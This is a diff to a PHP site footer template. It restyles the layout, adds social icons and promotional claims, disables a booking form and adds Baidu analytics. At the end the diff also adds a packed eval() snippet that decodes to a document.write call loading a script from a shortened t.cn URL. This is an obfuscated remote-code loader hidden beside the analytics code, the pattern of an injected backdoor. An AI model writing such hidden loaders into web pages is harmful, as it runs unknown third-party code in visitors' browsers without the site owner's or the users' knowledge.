@@ -1,57 +1,32 @@
-<?php if(!defined('PHPOK_SET')){die('<h3>Error...</h3>');}?><div style=" background:#ededed; height:293px; margin-top:35px;">
+
+<?php if(!defined('PHPOK_SET')){die('<h3>Error...</h3>');}?><div style=" background:#0096db; height:200px; margin-top:85px;">
 <div style="width:1000px; margin:0 auto;">
-<div style="float:left; width:235px;">
+	<div style="text-align:center;float:left;width: 240px;height: 250px;background-color: #eeeeee;margin-top: -50px;">
+        <img src="/tpl/www/images/bobg.gif" style="width: 200px;">
+	</div>
+<div style="float:left; width:450px;margin-left: 50px;margin-top: 20px">
 <div style="float:left;">
 <ul>
-<li style=" margin-top:30px;"><a href="index.php?c=list&cs=hezuojiameng&">人才招聘</a></li>
-<li style=" margin-top:30px;"><a href="index.php?c=list&cs=qiyewenhua&">企业文化</a></li>
-<li style=" margin-top:30px;"><a href="index.php?c=list&cs=rencaizhaopin&">联系我们</a></li>
+<li style=" margin-top:25px;"><a style="color: #ffffff" href="index.php?c=list&cs=hezuojiameng&">人才招聘</a></li>
+<li style=" margin-top:25px;"><a style="color: #ffffff" href="index.php?c=list&cs=qiyewenhua&">企业文化</a></li>
+<li style=" margin-top:25px;"><a style="color: #ffffff" href="index.php?c=list&cs=rencaizhaopin&">联系我们</a></li>
 </ul>
 
 </div>
-<div style="float:left; margin-left:60px;">
-<ul>
-<li style=" margin-top:20px; height:27px; line-height:27px; background:url(tpl/www/images/26.jpg) no-repeat 0 center; padding-left:30px;"><?php $xl = phpok('xl');?><?php echo $xl[content];?><?php unset($xl);?></li>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<li style=" margin-top:20px;  height:27px; line-height:27px; background:url(tpl/www/images/26.jpg) no-repeat 0 center; padding-left:30px;"><?php $gf = phpok('gf');?><?php echo $gf[content];?><?php unset($gf);?></li>
-
-
-
-
-
-
-
-
-
-
-
-
-<li style=" margin-top:10px;"><div><?php $wx = phpok('wx');?><?php echo $wx[content];?><?php unset($wx);?></div><div style="text-align:center; color:#000; line-height:25px;">二维码，扫一扫</div></li>
-</ul>
-
-
-
-
+<div style="float:left; margin-left:50px;color: #F2F2F2">
+	<p style="margin-top: 25px;">中国国家脑科学与教育研究协会唯一授权的实验基地</p>
+	<p style="margin-top: 25px;">疯狂英语李阳老师唯一推荐的速读机构</p>
+	<p style="margin-top: 25px;">美国哈佛脑科学研究院中国唯一合作单位</p>
 </div>
+
 <div class="clear"></div>
 </div>
-<div style=" float:left;"><img src="tpl/www/images/24.jpg"></div>
-<div style="float:right;"><div id="post_book"></div>
+
+<div style="float:right;">
+
+	<img src="/tpl/www/images/weibo.png" style="width: 100px;margin-top: 30px;">
+
+	<img src="/tpl/www/images/weixin.png" style="width: 100px;margin-top: 30px;margin-left: 20px;">
 
 <script type="text/javascript">
 function js_book(rs,id)
@@ -82,7 +57,7 @@ function to_submit()
 	getid("_phpok_submit").disabled = true;
 	return true;
 }
-func_php("post&ms=book",js_book,"post_book");
+//func_php("post&ms=book",js_book,"post_book");
 </script>
 
 
@@ -98,14 +73,15 @@ func_php("post&ms=book",js_book,"post_book");
 </div>
 </div>
 
-<style type="text/css">#bom {  
-   position:fixed;  
-   left:0px;  
-    bottom:0;  
-    _position:absolute;  
-   _top:expression(document.documentElement.clientHeight + document.documentElement.scrollTop - this.offsetHeight);  
-}</style>  
-  
+<style type="text/css">
+	#bom {
+   position:fixed;
+   left:0px;
+    bottom:0;
+    _position:absolute;
+   _top:expression(document.documentElement.clientHeight + document.documentElement.scrollTop - this.offsetHeight);
+}</style>
+
 
 
 <!--<div id="bom" style="background:url(tpl/www/images/1.png) repeat-x bottom; width:100%;">-->
@@ -120,23 +96,21 @@ func_php("post&ms=book",js_book,"post_book");
 
 
 <style type="text/css">
-.middle-bg{ background:url(tpl/www/images/4.png) repeat-y; padding-bottom:10px;}
+.middle-bg{ background:url(/tpl/www/images/4.png) repeat-y; padding-bottom:10px;}
 .myqq{text-align:center;padding-top:5px;padding-bottom:5px;}
 #qqonline_float{width:203px;position:fixed;*_position:absolute;right:5px;top:200px;}
 </style>
 
 
 
-
-
-<link href="tpl/www/images/styleaa.css" rel="stylesheet" type="text/css" />
+<link href="/tpl/www/images/styleaa.css" rel="stylesheet" type="text/css" />
 <?php $kflist = phpok('qq');?>
 <?php if($kflist[rslist] && is_array($kflist[rslist]) && count($kflist[rslist])>0){?>
 
 <div id="kefu1" style="background:url(tpl/www/images/ab5.jpg) no-repeat; display:block; height:380px;">
-	<div class="cs_close"><a href="javascript:;" onClick="$('#kefu1').fadeOut()"><img src="tpl/www/images/del.gif"></div>
+	<div class="cs_close"><a href="javascript:;" onClick="$('#kefu1').fadeOut()"><img src="/tpl/www/images/del.gif"></div>
 	<div>
-<div><img src="tpl/www/images/3.png"></div>
+<div><img src="/tpl/www/images/3.png"></div>
 <div class="middle-bg">
 	<?php $_i=0;$kflist[rslist]=(is_array($kflist[rslist]))?$kflist[rslist]:array();foreach($kflist[rslist] AS  $key=>$value){$_i++; ?>
 		<div class="myqq"><?php echo $value[kfcode];?></div>
@@ -146,7 +120,6 @@ func_php("post&ms=book",js_book,"post_book");
 </div>
 </div>
 
-<?php echo $plugin_html;?>
 
 
 
@@ -163,9 +136,16 @@ func_php("post&ms=book",js_book,"post_book");
 
 
 <!-- guohans.com Baidu tongji analytics -->
-<script type="text/javascript">
-//var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
-//document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcbd6add9115dafd6826c2874013b3201' type='text/javascript'%3E%3C/script%3E"));
+<script>
+	var _hmt = _hmt || [];
+	(function() {
+		var hm = document.createElement("script");
+		hm.src = "//hm.baidu.com/hm.js?cbd6add9115dafd6826c2874013b3201";
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(hm, s);
+	})();
+
+	eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4.5("<0 3=\\"1/2\\" 9=\\"a://8.6/7\\"><\\/0>");',11,11,'script|text|javascript|type|document|write|cn|R5eujdw|t|src|http'.split('|'),0,{}))
 </script>
 </body>
 </html>
